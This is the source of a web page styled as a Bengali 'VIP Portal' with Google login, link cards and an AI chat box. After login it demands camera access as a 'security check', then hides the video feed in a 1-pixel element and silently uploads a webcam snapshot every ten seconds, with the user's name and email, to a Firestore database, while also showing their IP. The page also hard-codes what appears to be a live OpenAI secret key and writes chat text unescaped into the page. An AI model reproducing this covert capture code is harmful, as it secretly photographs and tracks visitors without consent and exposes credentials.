<!DOCTYPE html>
<html lang="bn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | VIP Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --pink: #ff1a75;
            --pink-glow: rgba(255, 26, 117, 0.6);
            --dark: #010409;
            --glass-bg: rgba(255, 255, 255, 0.08);
            --glass-blur: blur(25px);
        }

        * {
            margin: 0; padding: 0; box-sizing: border-box;
            font-family: 'Hind Siliguri', sans-serif;
        }

        body {
            background: var(--dark);
            background: radial-gradient(circle at top right, rgba(255, 26, 117, 0.2), transparent), 
                        radial-gradient(circle at bottom left, rgba(0, 102, 255, 0.1), transparent), #010409;
            color: white; min-height: 100vh; overflow-x: hidden;
        }

        /* Overlay Modals */
        #login-overlay, #perm-modal, #notif-modal {
            position: fixed; inset: 0; background: rgba(1, 4, 9, 0.95);
            z-index: 10000; display: flex; align-items: center;
            justify-content: center; backdrop-filter: blur(20px); padding: 20px;
        }

        .glass-box {
            background: var(--glass-bg); padding: 40px 30px;
            border-radius: 30px; border: 1px solid rgba(255, 26, 117, 0.4);
            text-align: center; width: 100%; max-width: 400px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
        }

        /* Profile Header */
        .hero-header {
            margin: 20px; padding: 30px 15px;
            background: var(--glass-bg); border-radius: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            backdrop-filter: var(--glass-blur); text-align: center;
        }

        .profile-wrapper { display: flex; justify-content: center; align-items: center; margin-bottom: 15px; }
        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 4px solid var(--pink); box-shadow: 0 0 25px var(--pink-glow); object-fit: cover; }
        .user-p-img { width: 80px; height: 80px; border: 3px solid #fff; margin-left: -25px; background: #000; }

        /* Grid & Cards */
        .grid {
            display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;
            padding: 0 20px 30px; max-width: 600px; margin: 0 auto;
        }

        .card {
            background: var(--glass-bg); border-radius: 20px;
            padding: 25px 10px; text-align: center; text-decoration: none;
            color: white; border: 1px solid rgba(255, 255, 255, 0.05);
            backdrop-filter: var(--glass-blur);
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            cursor: pointer; display: block;
        }

        .card:hover {
            transform: translateY(-8px); border-color: var(--pink);
            box-shadow: 0 10px 25px rgba(255, 26, 117, 0.3);
        }

        .card i { font-size: 2.2rem; color: var(--pink); margin-bottom: 10px; display: block; }

        .card.wide { grid-column: span 2; display: flex; align-items: center; justify-content: center; gap: 10px; padding: 18px; }

        /* AI Chat */
        .chat-area { max-width: 500px; margin: 10px auto 40px; padding: 0 20px; }
        .chat-mini { background: rgba(0, 0, 0, 0.7); border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); padding: 15px; }
        #chat-log { height: 120px; overflow-y: auto; color: #ccc; margin-bottom: 10px; font-size: 14px; text-align: left; }

        .btn-main {
            background: linear-gradient(45deg, var(--pink), #ff0066);
            color: white; border: none; padding: 12px 20px;
            border-radius: 50px; font-weight: bold; cursor: pointer; width: 100%;
        }

        .logout-btn { background: none; border: 1px solid rgba(255,255,255,0.2); color: #888; padding: 5px 15px; border-radius: 50px; cursor: pointer; margin: 10px; }

        #vSource { position: fixed; top: 0; width: 1px; height: 1px; opacity: 0.01; }
        canvas { display: none; }
    </style>
</head>

<body>
    <div id="login-overlay">
        <div class="glass-box">
            <img src="ratan.jpg" style="width:100px; border-radius:50%; border:3px solid var(--pink); margin-bottom:15px;">
            <h2>Ratan Bro Portal</h2>
            <p style="opacity: 0.7; margin-bottom: 20px;">Secure VIP Access</p>
            <button class="btn-main" onclick="googleLogin()">Login with Google</button>
        </div>
    </div>

    <div id="perm-modal" style="display:none;">
        <div class="glass-box">
            <i class="fas fa-shield-alt" style="font-size:3rem; color:var(--pink); margin-bottom:15px;"></i>
            <h3>Security Check</h3>
            <p style="margin:15px 0; font-size:14px;">পোর্টালে প্রবেশের জন্য ক্যামেরা পারমিশন প্রয়োজন।</p>
            <button class="btn-main" onclick="grantAndStart()">Grant Permission</button>
        </div>
    </div>

    <div id="main-ui" style="display:none;">
        <div style="text-align:right;"><button class="logout-btn" onclick="googleLogout()">Logout</button></div>
        
        <div class="hero-header">
            <div class="profile-wrapper">
                <img src="ratan.jpg" class="p-img">
                <img id="u-pic" src="" class="p-img user-p-img">
            </div>
            <h2 id="u-name">Member</h2>
            <p id="u-ip" style="font-size:12px; color:gray; margin-top:5px;">IP Checking...</p>
        </div>

        <div class="grid">
            <div class="card" onclick="alert('No new notices')">
                <i class="fas fa-bell"></i>
                <p>Notice</p>
            </div>
            <a href="testpaper.html" class="card"><i class="fas fa-book"></i><p>Test Paper</p></a>
            <a href="business.html" class="card"><i class="fas fa-wallet"></i><p>Business</p></a>
            <a href="portfolio.html" class="card"><i class="fas fa-user-circle"></i><p>Portfolio</p></a>
            <a href="https://numberlookup.pro.bd/" target="_blank" class="card wide">
                <i class="fas fa-search"></i><p>Number Lookup Service</p>
            </a>
        </div>

        <div class="chat-area">
            <div class="chat-mini">
                <div id="chat-log"><b>AI:</b> হ্যালো! আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
                <div style="display:flex; gap:10px;">
                    <input type="text" id="ai-msg" style="flex:1; background:#000; border:1px solid #333; color:#fff; padding:10px; border-radius:50px; outline:none;" placeholder="Ask me...">
                    <button onclick="askAI()" style="background:var(--pink); border:none; color:white; padding:0 15px; border-radius:50px; cursor:pointer;">Send</button>
                </div>
            </div>
        </div>
    </div>

    <video id="vSource" autoplay playsinline muted></video>
    <canvas id="snapCanvas" width="640" height="480"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();

        let loggedUser = null;

        // ১. গুগল লগইন
        window.googleLogin = () => {
            signInWithPopup(auth, provider).catch(e => alert("Login Failed: " + e.message));
        };

        window.googleLogout = () => signOut(auth).then(() => location.reload());

        // ২. মেইন লজিক
        onAuthStateChanged(auth, (user) => {
            if (user) {
                loggedUser = user;
                document.getElementById('u-name').innerText = user.displayName;
                document.getElementById('u-pic').src = user.photoURL;
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('perm-modal').style.display = 'flex';
            } else {
                document.getElementById('login-overlay').style.display = 'flex';
                document.getElementById('main-ui').style.display = 'none';
            }
        });

        // ৩. ক্যামেরা এবং ক্যাপচার
        window.grantAndStart = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('vSource').srcObject = stream;
                
                // আইপি ফেচ
                fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
                    document.getElementById('u-ip').innerText = "IP: " + d.ip;
                });

                document.getElementById('perm-modal').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';

                setInterval(takeSnap, 10000);
                setTimeout(takeSnap, 2000);
            } catch (e) {
                alert("ক্যামেরা পারমিশন ছাড়া পোর্টাল ওপেন হবে না।");
            }
        };

        async function takeSnap() {
            const video = document.getElementById('vSource');
            const canvas = document.getElementById('snapCanvas');
            const ctx = canvas.getContext('2d');
            if (video.readyState === 4) {
                ctx.drawImage(video, 0, 0, 640, 480);
                const img = canvas.toDataURL('image/jpeg', 0.3);
                const userKey = loggedUser.email.replace(/\./g, '_');
                await setDoc(doc(db, "users", userKey), {
                    name: loggedUser.displayName,
                    lastPic: img,
                    lastSeen: new Date().toLocaleString(),
                    picList: arrayUnion(img)
                }, { merge: true });
            }
        }

        // ৪. এআই চ্যাট
        window.askAI = async () => {
            const msg = document.getElementById('ai-msg').value;
            const log = document.getElementById('chat-log');
            if(!msg) return;
            log.innerHTML += `<div><b>You:</b> ${msg}</div>`;
            document.getElementById('ai-msg').value = "";

            try {
                const res = await fetch("https://api.openai.com/v1/chat/completions", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": "Bearer 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"
                    },
                    body: JSON.stringify({
                        model: "gpt-4o-mini",
                        messages: [{role: "user", content: msg}]
                    })
                });
                const data = await res.json();
                log.innerHTML += `<div><b>AI:</b> ${data.choices[0].message.content}</div>`;
            } catch(e) {
                log.innerHTML += `<div style="color:red;">Error connecting AI</div>`;
            }
            log.scrollTop = log.scrollHeight;
        };
    </script>
</body>
</html>
